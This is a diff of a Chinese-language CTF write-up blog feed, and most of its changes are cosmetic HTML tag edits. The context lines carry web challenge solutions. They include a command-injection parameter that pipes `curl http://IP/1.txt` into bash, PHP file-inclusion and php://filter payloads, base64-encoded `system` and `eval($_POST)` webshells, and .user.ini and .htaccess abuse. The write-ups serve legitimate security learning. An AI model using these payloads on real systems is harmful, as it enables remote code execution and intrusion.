 &lt;/div&gt;&lt;p&gt;可以看到抽奖人信息被保存在&lt;code&gt;$serilized&lt;/code&gt;变量中，然后加密，加密方法是&lt;strong&gt;MCRYPT_RIJNDAEL_256加密&lt;/strong&gt;，是以256位为一个块，即32字节。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;加密流程&lt;/strong&gt;(例)：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;{&amp;quot;lottery&amp;quot;:&amp;quot;48e51545-cfd3-4d2e-8ea4-851c945b5faf&amp;quot;,&amp;quot;user&amp;quot;:&amp;quot;0123ff93-c230-49b9-b078-5d205247c5a8&amp;quot;,&amp;quot;coin&amp;quot;:81}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{&amp;quot;lottery&amp;quot;:&amp;quot;48e51545-cfd3-4d2e-8ea4-851c945b5faf&amp;quot;,&amp;quot;user&amp;quot;:&amp;quot;0123ff93-c230-49b9-b078-5d205247c5a8&amp;quot;,&amp;quot;coin&amp;quot;:81}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;按照32字节的分组后结构如下&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;{&amp;quot;lottery&amp;quot;:&amp;quot;48e51545-cfd3-4d2e-8
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{&amp;quot;lottery&amp;quot;:&amp;quot;48e51545-cfd3-4d2e-8
 ea4-851c945b5faf&amp;quot;,&amp;quot;user&amp;quot;:&amp;quot;0123ff
 93-c230-49b9-b078-5d205247c5a8&amp;quot;,
 &amp;quot;coin&amp;quot;:81}AAAAAAAAAAAAAAAAAAAAAA(不足位填充)
@@ -12558,7 +12956,7 @@ ea4-851c945b5faf&amp;quot;,&amp;quot;user&amp;quot;:&amp;quot;0123ff
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://www.php.net/manual/zh/function.hash-hmac.php&#34;&gt;php参考手册&lt;/a&gt;中提到参数为数组时返回NULL，此时$clandestine值即为NULL，那么$hh就可以算出来了。echo加exec，那也不用弹什么shell了，直接命令执行，回显只会显示最后一行，base64也无法完全显示出来，只能弹shell了。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;White-cat-monitor[]=ttt&amp;amp;Black-Cat-Sheriff=hash值&amp;amp;One-ear=;curl http://IP/1.txt|bash
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;White-cat-monitor[]=ttt&amp;amp;Black-Cat-Sheriff=hash值&amp;amp;One-ear=;curl http://IP/1.txt|bash
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag在环境变量里，之前也猜到在环境变量里了，但是&lt;code&gt;echo $FLAG&lt;/code&gt;的hash值总是匹配不上，也不知道为啥。。。&lt;/p&gt;
 &lt;p&gt;后面的两道一道Java一道PWN，不是我现在能做的😂&lt;/p&gt;
 &lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
@@ -12944,7 +13342,7 @@ ea4-851c945b5faf&amp;quot;,&amp;quot;user&amp;quot;:&amp;quot;0123ff
             
                 <content type="html">&lt;h2 id=&#34;359度防护网站&#34;&gt;359度防护网站&lt;/h2&gt;
 &lt;p&gt;大意了啊，没有扫！来，注！来，waf！就会用SQL欺负我这个练习时长两年半的老lj。。。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/administrator.html
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/administrator.html
 /home.php
 /index.php.bak
 /log_in.php
@@ -12952,7 +13350,7 @@ ea4-851c945b5faf&amp;quot;,&amp;quot;user&amp;quot;:&amp;quot;0123ff
 /test.php
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/robots.txt&lt;/code&gt;提示了&lt;code&gt;/administrator.html&lt;/code&gt;路由，访问&lt;code&gt;/administrator.html&lt;/code&gt;，存在一个登录框，复现的话就不搞事情了(滑稽)&lt;/p&gt;
 &lt;p&gt;下载index.php.bak得到一个请求体&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;GET /important_index_its_so_long_right.php?id=1 HTTP/1.1
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /important_index_its_so_long_right.php?id=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -12973,7 +13371,7 @@ Upgrade-Insecure-Requests: 1
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;访问获得日志记录，base64解码，然后访问&lt;code&gt;up_lo_ad_ad_min.php&lt;/code&gt;，看名字是upload，应该是上传，寻找上传点，找不到。。。看了wp才发现原来还有另一个库&lt;code&gt;h1nt&lt;/code&gt;，注入得到字段内容：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1:00001:last_index_come_on_swpu_ctf.php?id=4
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1:00001:last_index_come_on_swpu_ctf.php?id=4
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用00001登录&lt;code&gt;up_lo_ad_ad_min.php&lt;/code&gt;，出现上传点，绕不过，这里应该利用不了。。。不过此时hint字段的页面可以访问了且存在注入，直接&lt;strong&gt;load_file&lt;/strong&gt;读取flag。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -13128,7 +13526,7 @@ Disallow: /index.php?route=pricing&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;在&lt;code&gt;contact.action&lt;/code&gt;源码中找到一个GET表单，它获得输入后直接将输入值插入html表单而不做任何处理，只有一个html实体化，这样的话我们就可以通过编码绕过然后包含执行。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;http://47.116.79.40:32773/php:%252f/filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFt0eXNraWxsMTFdKTs/Pg%23.action?tyskill11=phpinfo();
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://47.116.79.40:32773/php:%252f/filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFt0eXNraWxsMTFdKTs/Pg%23.action?tyskill11=phpinfo();
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关键词搜索flag，找到&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;open_basedir: /var/www/html/f83b25c297736f9df64b448d0cfe9c70:/flag.txt&lt;/p&gt;
@@ -13375,7 +13773,7 @@ hint2: User-Agent&lt;/p&gt;
 &lt;h2 id=&#34;web162163&#34;&gt;web162~163&lt;/h2&gt;
 &lt;p&gt;又ban了点，不能使用字符串拼接了，使用&lt;strong&gt;session文件包含&lt;/strong&gt;，这个点在文件包含出现过，&lt;a href=&#34;https://tyskill.github.io/Articles/CTFshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#web82~86&#34;&gt;传送门&lt;/a&gt;。&lt;/p&gt;
 &lt;p&gt;.user.ini&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-code&#34; data-lang=&#34;code&#34;&gt;GIF89a
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-code&#34; data-lang=&#34;code&#34;&gt;GIF89a
 auto_prepend_file=/tmp/sess_tyskill
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;脚本&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -13496,13 +13894,13 @@ auto_prepend_file=/tmp/sess_tyskill
 &lt;blockquote&gt;
 &lt;p&gt;无过滤include&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;?file=data://text/plain,&amp;lt;?php system(&amp;quot;cat flag.php&amp;quot;)?&amp;gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;?file=data://text/plain,&amp;lt;?php system(&amp;quot;cat flag.php&amp;quot;)?&amp;gt;
 ?file=php://filter/convert.base64-encode/resource=flag.php
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;web79&#34;&gt;web79&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;过滤php字段&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKT8+
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKT8+
 /* &amp;lt;?php system(&amp;quot;cat flag.php&amp;quot;) */
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;web8081&#34;&gt;web80~81&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -13767,12 +14165,12 @@ auto_prepend_file=/tmp/sess_tyskill
 &lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8163&#34;&gt;file_put_content和死亡·杂糅代码之缘&lt;/a&gt;&lt;/p&gt;
 &lt;h3 id=&#34;rot13&#34;&gt;rot13&lt;/h3&gt;
 &lt;p&gt;      利用php伪协议中的string.rot13过滤器将&lt;code&gt;&amp;lt;?php die(&#39;大佬别秀了&#39;);?&amp;gt;&lt;/code&gt;&amp;quot;消掉&amp;quot;，这样就可以插入自己构造的php代码：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;GET: ?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2531%252e%2570%2568%2570
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;GET: ?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2531%252e%2570%2568%2570
 // php://filter/write=string.rot13/resource=1.php + 二次编码
 POST: content=&amp;lt;?cuc flfgrz(&#39;png sy0t.cuc&#39;);?&amp;gt;
 /* &amp;lt;?php system(&#39;cat fl0g.php&#39;);?&amp;gt; */
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;base64-decode&#34;&gt;base64-decode&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;GET: ?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;GET: ?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
 // php://filter/write=convert.base64-decode/resource=1.php + 二次编码
 POST: content=aaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
 /* &amp;lt;?php eval($_POST[&#39;cmd&#39;]);?&amp;gt; */
@@ -13782,7 +14180,7 @@ POST: content=aaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
 &lt;p&gt;/php|~|!|@|#|\$|%|^|&amp;amp;|*|(|)|-|_|+|=|./i&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;和前面的难度差不多，也挺好绕的。&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgYGxzYCIpPz4
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgYGxzYCIpPz4
 /* &amp;lt;?php system(&amp;quot;tac `ls`&amp;quot;)?&amp;gt; */
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;web116&#34;&gt;web116&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -13860,11 +14258,11 @@ POST: content=aaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;新过滤器&#34;&gt;新过滤器&lt;/h3&gt;
 &lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8163&#34;&gt;file_put_content和死亡·杂糅代码之缘&lt;/a&gt;的&lt;code&gt;convert.iconv.&lt;/code&gt;：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;GET: ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=tyskill.php
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;GET: ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=tyskill.php
 POST: contents=&amp;lt;ap?ph@ vela$(P_SO[Tytksli]l;)&amp;gt;?
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;字符串截取不会&#34;&gt;字符串截取(不会)&lt;/h3&gt;
 &lt;blockquote&gt;
-&lt;p&gt;Hint:&lt;br&gt;
+&lt;p&gt;Hint: &lt;br&gt;
 &lt;code&gt;${PATH:1:1}&lt;/code&gt;来获得字母&lt;br&gt;
 &lt;code&gt;${#PATH}&lt;/code&gt;来统计字母个数&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -13986,7 +14384,7 @@ hint1: script.js has sth useful.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;mi&#34;&gt;_0&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;x23132f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;_0&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;x1bef85&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x5&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)](&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/[\/\*\&amp;#39;\&amp;#34;\`\&amp;lt;\\\&amp;gt;\-\(\)\[\]\=\%\.]/g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;nx&#34;&gt;_0x23132f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1bef85&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x5&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)](&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/[\/\*\&amp;#39;\&amp;#34;\`\&amp;lt;\\\&amp;gt;\-\(\)\[\]\=\%\.]/g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;2、过滤完关键字符后再对生成的html代码作xor处理，去不去混淆代码都挺废人的，还是不放了&lt;/p&gt;
@@ -16382,7 +16780,7 @@ hint3：给你过滤的关键词又如何，[&#39;import&#39;, &#39;open&#39;, &
 &lt;/blockquote&gt;
 &lt;p&gt;有waf。那在vps上试试，向vps发起请求，观察请求头：&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;User-Agent: scrapy_redis&lt;br&gt;
+&lt;p&gt;User-Agent: scrapy_redis &lt;br&gt;
 User-Agent: PycURL/7.43.0.6 libcurl/7.64.0 OpenSSL/1.1.1d zlib/1.2.11 libidn2/2.0.5 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.36.0 librtmp/2.3&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;发起两次请求，两次请求的UA分别是上面的&lt;code&gt;redis&lt;/code&gt;和&lt;code&gt;pycurl&lt;/code&gt;， redis打了没回显，放弃。&lt;/p&gt;
@@ -16778,7 +17176,7 @@ HOSTNAME=72983b72e40a PYTHON_VERSION=3.8.5 PWD=/code HOME=/home/ctf ... PATH=/us
 &lt;p&gt;      根据&lt;code&gt;使用帮助&lt;/code&gt;的文档，我们可以获得一个等级为Peasant的帐号&lt;code&gt;888888&lt;/code&gt;，且文档透露了&lt;code&gt;receipt.txt&lt;/code&gt;文件的内容：(此处以帐号888888为例，账号取决于你获取链接时输入的员工账号)&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;亲爱的员工888888，您自助申请的PT邀请服务已受理完成，邀请链接在附件压缩包中，欢迎下次使用。&lt;/p&gt;
-&lt;p&gt;申请编号：202009293667&lt;br&gt;
+&lt;p&gt;申请编号：202009293667 &lt;br&gt;
 ByteCTF Secret PT Server&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;      已知zip解密后的内容，我们可以想到&lt;code&gt;zip明文攻击&lt;/code&gt;。&lt;a href=&#34;https://lazzzaro.github.io/2020/09/26/match-CTFshow-%E6%9C%88%E9%A5%BC%E6%9D%AF/#misc2-%E6%B4%97%E5%AF%B0%E7%80%9B&#34;&gt;https://lazzzaro.github.io/2020/09/26/match-CTFshow-%E6%9C%88%E9%A5%BC%E6%9D%AF/#misc2-%E6%B4%97%E5%AF%B0%E7%80%9B&lt;/a&gt;这道题的考点就是zip明文攻击，原理文章中也有叙述。&lt;/p&gt;
@@ -16818,12 +17216,12 @@ ByteCTF Secret PT Server&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;receipt.txt&lt;/strong&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;亲爱的员工888888，您自助申请的PT邀请服务已受理完成，邀请链接在附件压缩包中，欢迎下次使用。&lt;/p&gt;
-&lt;p&gt;申请编号：202010298688&lt;br&gt;
+&lt;p&gt;申请编号：202010298688 &lt;br&gt;
 ByteCTF Secret PT Server&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;访问链接地址进行注册，然后登录，在&lt;code&gt;论坛&lt;/code&gt;功能面板处存在一个帖子需要&lt;code&gt;Elite User&lt;/code&gt;才能查看。寻找提升等级的办法，在&lt;code&gt;常见问题&lt;/code&gt;面板处找到&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;Elite User:&lt;br&gt;
+&lt;p&gt;Elite User: &lt;br&gt;
 必须注册至少0周，并且下载至少120G，分享率大于1.55。&lt;br&gt;
 当条件符合时将被自动提升。注意，无论何时，如果你的分享率低于1.45，你将自动降级。&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -17079,7 +17477,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;得到函数偏移地址：&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;1337: 0000000000046590    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5&lt;br&gt;
+&lt;p&gt;1337: 0000000000046590    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5 &lt;br&gt;
 1681: 00000000000ef160    90 FUNC    WEAK   DEFAULT   12 open@@GLIBC_2.2.5&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;对于为什么&lt;code&gt;0x7ffff5f40000&lt;/code&gt;是system函数的起始地址？我的理解是：这个内存拥有可执行权限&lt;code&gt;r-xp&lt;/code&gt;，而其他三个并没有，因此这个内存地址是system函数的起始地址。&lt;/p&gt;
@@ -17885,7 +18283,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
         &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
         &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;eval -&amp;gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;vm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
     &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;readFileSync&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;readFileSync&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
     &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
 
@@ -18031,7 +18429,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
       &lt;strong&gt;Lua&lt;/strong&gt;是一个简洁、轻量、可扩展的&lt;strong&gt;脚本语言&lt;/strong&gt;。Lua有着相对简单的C API而很容易嵌入应用中。很多应用程序使用Lua作为自己的嵌入式脚本语言，以此来实现可配置性、可扩展性。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;首先，我们需要能够指定&lt;strong&gt;使用lua解析的文件&lt;/strong&gt;，这就需要配置文件&lt;code&gt;.htaccess&lt;/code&gt;的帮助。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;AddHandler lua-script .lua
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AddHandler lua-script .lua
 # 指定lua后缀的文件使用lua语言执行。
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后上传lua脚本：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -18478,7 +18876,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;该命令可以帮助我们在提取时删去空行，然后得到提取出来的数据：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;000800ff00000000
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;000800ff00000000
 0008000000000000
 000800ff00000000
 0008000000000000
@@ -19019,7 +19417,7 @@ endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture frac
 &lt;/blockquote&gt;
 &lt;p&gt;      根据关键词&lt;strong&gt;Biometric list&lt;/strong&gt;在Github中找到&lt;a href=&#34;https://github.com/dgryski/go-pgpwords&#34;&gt;go-pgpwords&lt;/a&gt;，但是由于没有go环境，就顺着解密脚本提供的链接找到了密码表的&lt;a href=&#34;https://en.wikipedia.org/wiki/PGP_word_list&#34;&gt;地址&lt;/a&gt;。&lt;/p&gt;
 &lt;p&gt;      接着自动化获得密文对应的十六进制码并解码：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;You can see my collection puzzles in /hint.rar and another /encode.png.
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;You can see my collection puzzles in /hint.rar and another /encode.png.
 By the way,the picture shoud be used 
 &amp;quot;Yusa&amp;quot; is very important in this challenge!!
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;      从解码出来的文字中我们可以得到两个信息：&lt;/p&gt;
@@ -19196,7 +19594,7 @@ By the way,the picture shoud be used
                 <content type="html">&lt;h2 id=&#34;cscctf-2019-qualflasklight&#34;&gt;[CSCCTF 2019 Qual]FlaskLight&lt;/h2&gt;
 &lt;p&gt;F12得到一段信息：&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;Parameter Name: search&lt;br&gt;
+&lt;p&gt;Parameter Name: search &lt;br&gt;
 Method: GET&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;应该要以GET请求传递search参数，直接上payload：&lt;/p&gt;
